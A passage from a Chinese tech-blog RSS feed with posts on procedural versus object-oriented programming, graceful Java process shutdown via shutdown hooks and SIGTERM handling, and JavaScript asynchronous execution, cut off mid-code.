&lt;p&gt;&lt;span&gt; 三、面向对象和面向工程的区别&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　之前在那篇博客上看到这个比喻，觉得特别恰当，挺容易让人理解的，现在分享一下：&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;　　&lt;strong&gt;用面向过程的方法写出来的程序是一份蛋炒饭，而用面向对象写出来的程序是一份盖浇饭。所谓盖浇饭，北京叫盖饭，东北叫烩饭，广东叫碟头饭，就是在一碗白米饭上面浇上一份盖菜，你喜欢什么菜，你就浇上什么菜。我觉得这个比喻还是比较贴切的。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　　蛋炒饭制作的细节，我不太清楚，因为我没当过厨师，也不会做饭，但最后的一道工序肯定是把米饭和鸡蛋混在一起炒匀。盖浇饭呢，则是把米饭和盖菜分别做好，你如果要一份红烧肉盖饭呢，就给你浇一份红烧肉；如果要一份青椒土豆盖浇饭，就给浇一份青椒土豆丝。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　　蛋炒饭的好处就是入味均匀，吃起来香。如果恰巧你不爱吃鸡蛋，只爱吃青菜的话，那么唯一的办法就是全部倒掉，重新做一份青菜炒饭了。盖浇饭就没这么多麻烦，你只需要把上面的盖菜拨掉，更换一份盖菜就可以了。盖浇饭的缺点是入味不均，可能没有蛋炒饭那么香。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　　到底是蛋炒饭好还是盖浇饭好呢？其实这类问题都很难回答，非要比个上下高低的话，就必须设定一个场景，否则只能说是各有所长。如果大家都不是美食家，没那么多讲究，那么从饭馆角度来讲的话，做盖浇饭显然比蛋炒饭更有优势，他可以组合出来任意多的组合，而且不会浪费。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;　　盖浇饭的好处就是”菜”“饭”分离，从而提高了制作盖浇饭的灵活性。饭不满意就换饭，菜不满意换菜。用软件工程的专业术语就是”可维护性“比较好，”饭” 和”菜”的耦合度比较低。蛋炒饭将”蛋”“饭”搅和在一起，想换”蛋”“饭”中任何一种都很困难，耦合度很高，以至于”可维护性”比较差。软件工程追求的目标之一就是可维护性，可维护性主要表现在3个方面：可理解性、可测试性和可修改性。面向对象的好处之一就是显著的改善了软件系统的可维护性。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;四、总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　面向过程：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;strong&gt;优点：性能比面向对象高，因为类调用时需要实例化，开销比较大，比较消耗资源;比如单片机、嵌入式开发、 Linux/Unix等一般采用面向过程开发，性能是最重要的因素。&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;　　　　缺点：没有面向对象易维护、易复用、易扩展&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　面向对象：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　　　优点：易维护、易复用、易扩展，由于面向对象有封装、继承、多态性的特性，可以设计出低耦合的系统，使系统 更加灵活、更加易于维护 &lt;br/&gt;　　　　缺点：性能比面向过程低&lt;/strong&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 21 May 2019 15:37:00 +0000</pubDate>
<dc:creator>风好大呀</dc:creator>
<og:description>前言： 接触面向对象的概念也差不多两年了，对于面向对象也有着自己的一些感悟，期间也看到过面向过程的一些文章，但总是对于两种思想没有明确的区别概念，刚好今天在某篇博客上看到对于两者的区别。所以便写下这篇</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/pylearner/p/10903266.html</dc:identifier>
</item>
<item>
<title>如何优雅地停止Java进程 - 2Simple</title>
<link>http://www.cnblogs.com/nuccch/p/10903162.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nuccch/p/10903162.html</guid>
<description>&lt;h2 id=&quot;目录&quot;&gt;目录&lt;/h2&gt;
&lt;h2 id=&quot;理解停止java进程的本质&quot;&gt;理解停止Java进程的本质&lt;/h2&gt;
&lt;p&gt;我们知道，Java程序的运行需要一个运行时环境，即：JVM，启动Java进程即启动了一个JVM。&lt;br/&gt;因此，所谓停止Java进程，本质上就是关闭JVM。&lt;br/&gt;那么，哪些情况会导致JVM关闭呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/722072/201905/722072-20190521232151642-1040297586.png&quot; alt=&quot;JVM关闭&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;应该如何正确地停止java进程&quot;&gt;应该如何正确地停止Java进程&lt;/h2&gt;
&lt;p&gt;通常来讲，停止一个进程只需要杀死进程即可。&lt;br/&gt;但是，在某些情况下可能需要在JVM关闭之前执行一些数据保存或者资源释放的工作，此时就不能直接强制杀死Java进程。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;对于正常关闭或异常关闭的几种情况，JVM关闭前，都会调用已注册的关闭钩子，基于这种机制，我们可以将扫尾的工作放在关闭钩子中，进而使我们的应用程序安全的退出。而且，基于平台通用性的考虑，更推荐应用程序使用System.exit(0)这种方式退出JVM。&lt;/li&gt;
&lt;li&gt;对于强制关闭的几种情况：&lt;code&gt;系统关机&lt;/code&gt;，操作系统会通知JVM进程等待关闭，一旦等待超时，系统会强制中止JVM进程；而&lt;code&gt;kill -9&lt;/code&gt;、&lt;code&gt;Runtime.halt()&lt;/code&gt;、&lt;code&gt;断电&lt;/code&gt;、&lt;code&gt;系统crash&lt;/code&gt;这些方式会直接无商量中止JVM进程，JVM完全没有执行扫尾工作的机会。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;综上所述：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;除非非常确定不需要在Java进程退出之前执行收尾的工作，否则强烈不建议使用&lt;code&gt;kill -9&lt;/code&gt;这种简单暴力的方式强制停止Java进程（除了&lt;code&gt;系统关机&lt;/code&gt;，&lt;code&gt;系统Crash&lt;/code&gt;，&lt;code&gt;断电&lt;/code&gt;，和&lt;code&gt;Runtime.halt()&lt;/code&gt;我们无能为力之外）。&lt;/li&gt;
&lt;li&gt;不论如何，都应该在Java进程中注册关闭钩子，尽最大可能地保证在Java进程退出之前做一些善后的事情（实际上，大多数时候都需要这样做）。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;如何注册关闭钩子&quot;&gt;如何注册关闭钩子&lt;/h3&gt;
&lt;p&gt;在Java中注册关闭钩子通过Runtime类实现：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Runtime.getRuntime().addShutdownHook(new Thread(){
    @Override
    public void run() {
        // 在JVM关闭之前执行收尾工作
        // 注意事项：
        // 1.在这里执行的动作不能耗时太久
        // 2.不能在这里再执行注册，移除关闭钩子的操作
        // 3 不能在这里调用System.exit()
        System.out.println(&quot;do shutdown hook&quot;);
    }
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为JVM注册关闭钩子的时机不固定，可以在启动Java进程之前，也可以在Java进程之后（如：在监听到操作系统信号量之后再注册关闭钩子也是可以的）。&lt;/p&gt;
&lt;h3 id=&quot;使用关闭钩子的注意事项&quot;&gt;使用关闭钩子的注意事项&lt;/h3&gt;
&lt;p&gt;1.关闭钩子本质上是一个线程（也称为Hook线程），对于一个JVM中注册的多个关闭钩子它们将会并发执行，所以JVM并不保证它们的执行顺序；由于是并发执行的，那么很可能因为代码不当导致出现竞态条件或死锁等问题，为了避免该问题，强烈建议只注册一个钩子并在其中执行一系列操作。&lt;br/&gt;2.Hook线程会延迟JVM的关闭时间，这就要求在编写钩子过程中必须要尽可能的减少Hook线程的执行时间，避免hook线程中出现耗时的计算、等待用户I/O等等操作。&lt;br/&gt;3.关闭钩子执行过程中可能被强制打断，比如在操作系统关机时，操作系统会等待进程停止，等待超时，进程仍未停止，操作系统会强制的杀死该进程，在这类情况下，关闭钩子在执行过程中被强制中止。&lt;br/&gt;4.在关闭钩子中，不能执行注册、移除钩子的操作，JVM将关闭钩子序列初始化完毕后，不允许再次添加或者移除已经存在的钩子，否则JVM抛出IllegalStateException异常。&lt;br/&gt;5.不能在钩子调用System.exit()，否则卡住JVM的关闭过程，但是可以调用Runtime.halt()。&lt;br/&gt;6.Hook线程中同样会抛出异常，对于未捕捉的异常，线程的默认异常处理器处理该异常（将异常信息打印到System.err），不会影响其他hook线程以及JVM正常退出。&lt;/p&gt;
&lt;h3 id=&quot;信号量机制&quot;&gt;信号量机制&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/722072/201905/722072-20190521231712569-1043190647.png&quot; alt=&quot;优雅地关闭Java进程&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注册关闭钩子的目的是为了在JVM关闭之前执行一些收尾的动作，而从上述描述可以知道，触发关闭钩子动作的执行需要满足JVM正常关闭或异常关闭的情形。&lt;br/&gt;显然，我们应该正常关闭JVM（异常关闭JVM的情形不希望发生，也无法百分之百地完全杜绝），即执行：&lt;code&gt;System.exit()&lt;/code&gt;，&lt;code&gt;Ctrl + C&lt;/code&gt;， &lt;code&gt;kill -15 进程ID&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;System.exit()：通常我们在程序运行完毕之后调用，这是在应用代码中写死的，无法在进程外部进行调用。&lt;/li&gt;
&lt;li&gt;Ctrl + C：如果Java进程运行在操作系统前台，可以通过键盘中断的方式结束运行；但是当进程在后台运行时，就无法通过&lt;code&gt;Ctrl + C&lt;/code&gt;方式退出了。&lt;/li&gt;
&lt;li&gt;Kill (-15)SIGTERM信号：使用kill命令结束进程是使用操作系统的信号量机制，不论进程运行在操作系统前台还是后台，都可以通过kill命令结束进程，这也是结束进程使用得最多的方式。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;实际上，大多数情况下的进程结束操作通常是在进程运行过程中需要停止进程或者重启进程，而不是等待进程自己运行结束（服务程序都是一直运行的，并不会主动结束）。也就是说，针对JVM正常关闭的情形，大多数情况是使用&lt;code&gt;kill -15 进程ID&lt;/code&gt;的方式实现的。那么，我们是否可以结合操作系统的信号量机制和JVM的关闭钩子实现优雅地关闭Java进程呢？答案是肯定的，具体实现步骤如下：&lt;/p&gt;
&lt;p&gt;第一步：在应用程序中监听信号量&lt;br/&gt;由于不通的操作系统类型实现的信号量动作存在差异，所以监听的信号量需要根据Java进程实际运行的环境而定（如：Windows使用SIGINT，Linux使用SIGTERM）。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Signal sg = new Signal(&quot;TERM&quot;); // kill -15 pid
Signal.handle(sg, new SignalHandler() {
    @Override
    public void handle(Signal signal) {
        System.out.println(&quot;signal handle: &quot; + signal.getName());
        // 监听信号量，通过System.exit(0)正常关闭JVM，触发关闭钩子执行收尾工作
        System.exit(0);
    }
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二步：注册关闭钩子&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Runtime.getRuntime().addShutdownHook(new Thread(){
    @Override
    public void run() {
        // 执行进程退出前的工作
        // 注意事项：
        // 1.在这里执行的动作不能耗时太久
        // 2.不能在这里再执行注册，移除关闭钩子的操作
        // 3 不能在这里调用System.exit()
        System.out.println(&quot;do something&quot;);
    }
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;完整示例如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class ShutdownTest {
    public static void main(String[] args) {
        System.out.println(&quot;Shutdown Test&quot;);

        Signal sg = new Signal(&quot;TERM&quot;); // kill -15 pid
        // 监听信号量
        Signal.handle(sg, new SignalHandler() {
            @Override
            public void handle(Signal signal) {
                System.out.println(&quot;signal handle: &quot; + signal.getName());
                System.exit(0);
            }
        });
        // 注册关闭钩子
        Runtime.getRuntime().addShutdownHook(new Thread(){
            @Override
            public void run() {
                // 在关闭钩子中执行收尾工作
                // 注意事项：
                // 1.在这里执行的动作不能耗时太久
                // 2.不能在这里再执行注册，移除关闭钩子的操作
                // 3 不能在这里调用System.exit()
                System.out.println(&quot;do shutdown hook&quot;);
            }
        });

        mockWork();

        System.out.println(&quot;Done.&quot;);
        System.exit(0);
    }

    // 模拟进程正在运行
    private static void mockWork() {
        //mockRuntimeException();
        //mockOOM();
        try {
            Thread.sleep(120 * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } 
    }

    // 模拟在应用中抛出RuntimeException时会调用注册钩子
    private static void mockRuntimeException() {
        throw new RuntimeException(&quot;This is a mock runtime ex&quot;);
    }

    // 模拟应用运行出现OOM时会调用注册钩子
    // -xms10m -xmx10m
    private static void mockOOM() {
        List list = new ArrayList();
        for(int i = 0; i &amp;lt; 1000000; i++) {
            list.add(new Object());
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;网上有文章总结说可以直接使用监听信号量的机制来实现优雅地关闭Java进程（详见：&lt;a href=&quot;https://blog.csdn.net/carlislelee/article/details/52688693&quot;&gt;Java程序优雅关闭的两种方法&lt;/a&gt;)，实际上这是有问题的。因为单纯地监听信号量，并不能覆盖到异常关闭JVM的情形（如：RuntimeException或OOM），这种方式与注册关闭钩子的区别在于：&lt;br/&gt;1.关闭钩子是在独立线程中运行的，当应用进程被kill的时候main函数就已经结束了，仅会运行ShutdownHook线程中run()方法的代码。&lt;br/&gt;2.监听信号量方法中handle函数会在进程被kill时收到TERM信号，但对main函数的运行不会有任何影响，需要使用别的方式结束main函数（如：在main函数中添加布尔类型的flag，当收到TERM信号时修改该flag，程序便会正常结束；或者在handle函数中调用System.exit())。&lt;/p&gt;
&lt;p&gt;【参考】&lt;br/&gt;https://blog.csdn.net/u011001084/article/details/73480432 JVM安全退出(如何优雅的关闭java服务)&lt;br/&gt;http://yuanke52014.iteye.com/blog/2306805 Java保证程序结束时调用释放资源函数&lt;br/&gt;https://tessykandy.iteye.com/blog/2005767 基于kill信号优雅的关闭JAVA程序&lt;br/&gt;https://www.cnblogs.com/taobataoma/archive/2007/08/30/875743.html Linux 信号signal处理机制&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 15:18:00 +0000</pubDate>
<dc:creator>2Simple</dc:creator>
<og:description>目录 '理解停止Java进程的本质' '应该如何正确地停止Java进程' '如何注册关闭钩子' '使用关闭钩子的注意事项' '信号量机制' '总结' 理解停止Java进程的本质 我们知道，Java程序</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/nuccch/p/10903162.html</dc:identifier>
</item>
<item>
<title>浅析JavaScript异步 - Aaron-攻城狮</title>
<link>http://www.cnblogs.com/aaron---blog/p/10903118.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/aaron---blog/p/10903118.html</guid>
<description>&lt;p&gt;一直以来都知道&lt;code&gt;JavaScript&lt;/code&gt;是一门单线程语言，在笔试过程中不断的遇到一些输出结果的问题，考量的是对异步编程掌握情况。一般被问到异步的时候脑子里第一反应就是&lt;code&gt;Ajax&lt;/code&gt;，&lt;code&gt;setTimseout&lt;/code&gt;...这些东西。在平时做项目过程中，基本大多数操作都是异步的。&lt;code&gt;JavaScript&lt;/code&gt;异步都是通过回调形式完成的，开发过程中一直在处理回调，可能不知不觉中自己就已经处在&lt;code&gt;回调地狱&lt;/code&gt;中。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;浏览器线程&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在开始之前简单的说一下浏览器的线程，对浏览器的作业有个基础的认识。之前说过&lt;code&gt;JavaScript&lt;/code&gt;是单线程作业，但是并不代表浏览器就是单线程的。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;JavaScript&lt;/code&gt;引擎中负责解析和执行&lt;code&gt;JavaScript&lt;/code&gt;代码的线程只有一个。但是除了这个主进程以外，还有其他很多辅助线程。那么诸如&lt;code&gt;onclick&lt;/code&gt;回调，&lt;code&gt;setTimeout&lt;/code&gt;，&lt;code&gt;Ajax&lt;/code&gt;这些都是怎么实现的呢？即浏览器搞了几个其他线程去辅助&lt;code&gt;JavaScript&lt;/code&gt;线程的运行。&lt;/p&gt;
&lt;p&gt;浏览器有很多线程，例如：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;GUI渲染线程 - GUI渲染线程处于挂起状态的，也就是冻结状态&lt;/li&gt;
&lt;li&gt;JavaScript引擎线程 - 用于解析JavaScript代码&lt;/li&gt;
&lt;li&gt;定时器触发线程 - 浏览器定时计数器并不是 js引擎计数&lt;/li&gt;
&lt;li&gt;浏览器事件线程 - 用于解析BOM渲染等工作&lt;/li&gt;
&lt;li&gt;http线程 - 主要负责数据请求&lt;/li&gt;
&lt;li&gt;EventLoop轮询处理线程 - 事件被触发时该线程会把事件添加到待处理队列的队尾&lt;/li&gt;
&lt;li&gt;等等等&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;从上面来看可以得出，浏览器其实也做了很多事情，远远的没有想象中的那么简单，上面这些线程中&lt;code&gt;GUI渲染线程&lt;/code&gt;,&lt;code&gt;JavaScript引擎线程&lt;/code&gt;,&lt;code&gt;浏览器事件线程&lt;/code&gt;是浏览器的常驻线程。&lt;/p&gt;
&lt;p&gt;当浏览器开始解析代码的时候，会根据代码去分配给不同的辅助线程去作业。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进程是指在操作系统中正在运行的一个应用程序&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;线程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线程是指进程内独立执行某个任务的一个单元。线程自己基本上不拥有系统资源，只拥有一点在运行中必不可少的资源(如程序计数器，一组寄存器和栈)。&lt;/p&gt;
&lt;p&gt;进程中包含线程，一个进程中可以有N个进程。我们可以在电脑的任务管理器中查看到正在运行的进程，可以认为一个进程就是在运行一个程序，比如用浏览器打开一个网页，这就是开启了一个进程。但是比如打开3个浏览器，那么就开启了3个进程。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;同步&amp;amp;异步&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;既然要了解同步异步当然要简单的说一下同步和异步。说到同步和异步最有发言权的真的就属&lt;code&gt;Ajax&lt;/code&gt;了，为了让例子更加明显没有使用&lt;code&gt;Ajax&lt;/code&gt;举例。(●ˇ∀ˇ●)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同步&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同步会逐行执行代码，会对后续代码造成阻塞，直至代码接收到预期的结果之后，才会继续向下执行。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;console.log(1);
alert(&quot;同步&quot;);
console.log(2);

//  结果：
//  1
//  同步
//  2&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;异步&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果在函数返回的时候，调用者还不能够得到预期结果，而是将来通过一定的手段得到结果（例如回调函数），这就是异步。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;console.log(1);
setTimeout(() =&amp;gt; {
   alert(&quot;异步&quot;); 
},0);
console.log(2);

//  结果：
//  1
//  2
//  异步&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;为什么JavaScript要采用异步编程&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一开始就说过，&lt;code&gt;JavaScript&lt;/code&gt;是一种单线程执行的脚本语言（这可能是由于历史原因或为了简单而采取的设计）。它的单线程表现在任何一个函数都要从头到尾执行完毕之后，才会执行另一个函数，界面的更新、鼠标事件的处理、计时器（&lt;code&gt;setTimeout、setInterval&lt;/code&gt;等）的执行也需要先排队，后串行执行。假如有一段&lt;code&gt;JavaScript&lt;/code&gt;从头到尾执行时间比较长，那么在执行期间任何&lt;code&gt;UI&lt;/code&gt;更新都会被阻塞，界面事件处理也会停止响应。这种情况下就需要异步编程模式，目的就是把代码的运行打散或者让&lt;code&gt;IO&lt;/code&gt;调用（例如&lt;code&gt;AJAX&lt;/code&gt;）在后台运行，让界面更新和事件处理能够及时地运行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;语言的设计者意识到，这时主线程完全可以不管&lt;code&gt;IO&lt;/code&gt;设备，挂起处于等待中的任务，先运行排在后面的任务。等到&lt;code&gt;IO&lt;/code&gt;设备返回了结果，再回过头，把挂起的任务继续执行下去。&lt;/p&gt;
&lt;p&gt;异步运行机制：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;所有同步任务都在主线程上执行，形成一个执行栈。&lt;/li&gt;
&lt;li&gt;主线程之外，还存在一个&lt;code&gt;任务队列&lt;/code&gt;。只要异步任务有了运行结果，就在&lt;code&gt;任务队列&lt;/code&gt;之中放置一个事件。&lt;/li&gt;
&lt;li&gt;一旦&lt;code&gt;执行栈&lt;/code&gt;中的所有同步任务执行完毕，系统就会读取&lt;code&gt;任务队列&lt;/code&gt;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。&lt;/li&gt;
&lt;li&gt;主线程不断重复上面的第三步。&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;html&quot;&gt;
&lt;code&gt;&amp;lt;button onclick=&quot;updateSync()&quot;&amp;gt;同步&amp;lt;/button&amp;gt;
&amp;lt;button onclick=&quot;updateAsync()&quot;&amp;gt;异步&amp;lt;/button&amp;gt;
&amp;lt;div id=&quot;output&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;script&amp;gt;
function updateSync() {
  for (var i = 0; i &amp;lt; 1000000; i++) {
    document.getElementById('output').innerHTML = i;
  }
}
function updateAsync() {
  var i = 0;
  function updateLater() {
    document.getElementById('output').innerHTML = (i++);
    if (i &amp;lt; 1000000) {
      setTimeout(updateLater, 0);
    }
  }
  updateLater();
}
&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;点击&lt;code&gt;同步&lt;/code&gt;按钮会调用&lt;code&gt;updateSync&lt;/code&gt;的同步函数，逻辑非常简单，循环体内每次更新&lt;code&gt;output&lt;/code&gt;结点的内容为&lt;code&gt;i&lt;/code&gt;。如果在其他多线程模型下的语言，你可能会看到界面上以非常快的速度显示从&lt;code&gt;0&lt;/code&gt;到&lt;code&gt;999999&lt;/code&gt;后停止。但是在&lt;code&gt;JavaScript&lt;/code&gt;中，你会感觉按钮按下去的时候卡了一下，然后看到一个最终结果&lt;code&gt;999999&lt;/code&gt;，而没有中间过程，这就是因为在&lt;code&gt;updateSync&lt;/code&gt;函数运行过程中&lt;code&gt;UI&lt;/code&gt;更新被阻塞，只有当它结束退出后才会更新&lt;code&gt;UI&lt;/code&gt;。反之，当点击&lt;code&gt;异步&lt;/code&gt;的时候，会明显的看到&lt;code&gt;Dom&lt;/code&gt;在逐步更新的过程。&lt;/p&gt;
&lt;p&gt;从上面的例子中可以明显的看出，异步编程对于&lt;code&gt;JavaScript&lt;/code&gt;来说是多么多么的重要。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;异步编程有什么好处&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从编程方式来讲当然是同步编程的方式更为简单，但是同步有其局限性一是假如是单线程那么一旦遇到阻塞调用，会造成整个线程阻塞，导致&lt;code&gt;cpu&lt;/code&gt;无法得到有效利用，而浏览器的&lt;code&gt;JavaScript&lt;/code&gt;执行和浏览器渲染是运行在单线程中，一旦遇到阻塞调用不仅意味&lt;code&gt;JavaScript&lt;/code&gt;的执行被阻塞更意味整个浏览器渲染也被阻塞这就导致界面的卡死，若是多线程则不可避免的要考虑互斥和同步问题，而互斥和同步带来复杂度也很大，实际上浏览器下因为同时只能执行一段&lt;code&gt;JavaScript&lt;/code&gt;代码这意味着不存在互斥问题，但是同步问题仍然不可避免，以往回调风格中异步的流程控制（其实就是同步问题）也比较复杂。浏览器端的编程方式也即是&lt;code&gt;GUI编程&lt;/code&gt;，其本质就是事件驱动的（鼠标点击，&lt;code&gt;Http&lt;/code&gt;请求结束等）异步编程更为自然。&lt;/p&gt;
&lt;p&gt;突然有个疑问，既然如此为什么&lt;code&gt;JavaScript&lt;/code&gt;没有使用多线程作业呢？就此就去&lt;code&gt;Google&lt;/code&gt;了一下&lt;code&gt;JavaScript多线程&lt;/code&gt;，在&lt;code&gt;HTML5&lt;/code&gt;推出之后是提供了多线程只是比较局限。在使用多线程的时候无法使用&lt;code&gt;window&lt;/code&gt;对象。若&lt;code&gt;JavaScript&lt;/code&gt;使用多线程，在&lt;code&gt;A&lt;/code&gt;线程中正在操作&lt;code&gt;DOM&lt;/code&gt;，但是&lt;code&gt;B&lt;/code&gt;线程中已经把该&lt;code&gt;DOM&lt;/code&gt;已经删除了（只是简单的小栗子，可能还有很多问题，至于这些历史问题无从考究了）。会给编程作业带来很大的负担。就我而言我想这也就说明了为什么&lt;code&gt;JavaScript&lt;/code&gt;没有使用异步编程的原因吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;异步与回调&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;回调到底属于异步么？会想起刚刚开始学习&lt;code&gt;JavaScript&lt;/code&gt;的时候常常吧这两个概念混合在一起。在搞清楚这个问题，首先要明白什么是回调函数。&lt;/p&gt;
&lt;p&gt;百科：&lt;a href=&quot;https://baike.baidu.com/item/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0&quot;&gt;回调函数&lt;/a&gt;;回调函数是一个函数，它作为参数传递给另一个函数，并在父函数完成后执行。回调的特殊之处在于，出现在“父类”之后的函数可以在回调执行之前执行。另一件需要知道的重要事情是如何正确地传递回调。这就是我经常忘记正确语法的地方。&lt;/p&gt;
&lt;p&gt;通过上面的解释可以得出，回调函数本质上其实就是一种设计模式，例如我们熟悉的&lt;code&gt;JQuery&lt;/code&gt;也只不过是遵循了这个设计原则而已。在&lt;code&gt;JavaScript&lt;/code&gt;中，回调函数具体的定义为：函数&lt;code&gt;A&lt;/code&gt;作为参数(函数引用)传递到另一个函数&lt;code&gt;B&lt;/code&gt;中，并且这个函数&lt;code&gt;B&lt;/code&gt;执行函数&lt;code&gt;A&lt;/code&gt;。我们就说函数&lt;code&gt;A&lt;/code&gt;叫做回调函数。如果没有名称(函数表达式)，就叫做匿名回调函数。&lt;/p&gt;
&lt;p&gt;简单的举个小例子：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function test (n,fn){
    console.log(n);
    fn &amp;amp;&amp;amp; fn(n);
}
console.log(1);
test(2);
test(3,function(n){
    console.log(n+1)
});
console.log(5)

//  结果
//  1
//  2
//  3
//  4
//  5&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过上面的代码输出的结果可以得出回调函数不一定属于异步，一般同步会阻塞后面的代码，通过输出结果也就得出了这个结论。回调函数，一般在同步情境下是最后执行的，而在异步情境下有可能不执行，因为事件没有被触发或者条件不满足。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回调函数应用场景&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;资源加载：动态加载js文件后执行回调，加载iframe后执行回调，ajax操作回调，图片加载完成执行回调，AJAX等等。&lt;/li&gt;
&lt;li&gt;DOM事件及Node.js事件基于回调机制(Node.js回调可能会出现多层回调嵌套的问题)。&lt;/li&gt;
&lt;li&gt;setTimeout的延迟时间为0，这个hack经常被用到，settimeout调用的函数其实就是一个callback的体现&lt;/li&gt;
&lt;li&gt;链式调用：链式调用的时候，在赋值器(setter)方法中(或者本身没有返回值的方法中)很容易实现链式调用，而取值器(getter)相对来说不好实现链式调用，因为你需要取值器返回你需要的数据而不是this指针，如果要实现链式方法，可以用回调函数来实现。&lt;/li&gt;
&lt;li&gt;setTimeout、setInterval的函数调用得到其返回值。由于两个函数都是异步的，即：调用时序和程序的主流程是相对独立的，所以没有办法在主体里面等待它们的返回值，它们被打开的时候程序也不会停下来等待，否则也就失去了setTimeout及setInterval的意义了，所以用return已经没有意义，只能使用callback。callback的意义在于将timer执行的结果通知给代理函数进行及时处理。&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;JavaScript中的那些异步操作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;既然有很多的辅助线程，不可能所有的工作都是通过主线程去做，既然分配给辅助线程去做事情。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XMLHttpRequest&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象应该不是很陌生的，主要用于浏览器的数据请求与数据交互。&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象提供两种请求数据的方式，一种是&lt;code&gt;同步&lt;/code&gt;，一种是&lt;code&gt;异步&lt;/code&gt;。可以通过参数进行配置。默认为异步。&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;XMLHttpRequest&lt;/code&gt;这里就不作太多的赘述了。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;var xhr = new XMLHttpRequest();
